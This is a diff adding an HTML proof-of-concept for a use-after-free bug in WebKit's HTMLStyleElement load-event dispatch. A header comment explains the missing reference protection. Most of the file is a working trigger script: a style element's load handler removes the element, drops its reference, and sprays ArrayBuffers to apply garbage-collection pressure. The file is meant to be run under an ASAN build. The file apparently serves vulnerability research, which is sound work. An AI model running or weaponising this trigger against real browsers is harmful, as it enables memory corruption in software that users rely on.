@@ -1,0 +1,55 @@
+<!--
+  WebKit HTMLStyleElement::dispatchPendingEvent UAF PoC
+  
+  Bug: HTMLStyleElement::dispatchPendingEvent() at HTMLStyleElement.cpp:163 calls
+  dispatchEvent() without holding a Ref to protect 'this'. Same EventSender pattern
+  as HTMLLinkElement. Same missing protection as ImageLoader (patched in 48cd5ac71dd).
+  
+  Trigger: <style> elements fire load events via notifyLoadedSheetAndAllCriticalSubresources()
+  when their stylesheet content is parsed. The handler removes the element.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<title>HTMLStyleElement dispatchPendingEvent UAF PoC</title>
+</head>
+<body>
+<h2>HTMLStyleElement UAF - Load Event Dispatch Without Ref Protection</h2>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
+}
+
+// Create a <style> element
+var style = document.createElement('style');
+style.textContent = 'body { background: white; }';
+
+// Attach load event handler that removes the element
+style.addEventListener('load', function(e) {
+    log('[*] Load event fired on <style>');
+    
+    if (style.parentNode) {
+        style.parentNode.removeChild(style);
+        log('[*] Removed <style> from DOM');
+    }
+    style = null;
+    log('[*] Cleared JS reference');
+    
+    // GC pressure
+    var spray = [];
+    for (var i = 0; i < 10000; i++) {
+        spray.push(new ArrayBuffer(256));
+    }
+    log('[*] GC pressure applied');
+    spray = null;
+});
+
+// Add to DOM - the stylesheet will be parsed and load event scheduled
+document.head.appendChild(style);
+log('[+] PoC loaded. Waiting for <style> load event...');
+log('[+] Run under ASAN-enabled WebKit for UAF detection.');
+</script>
+</body>
+</html>
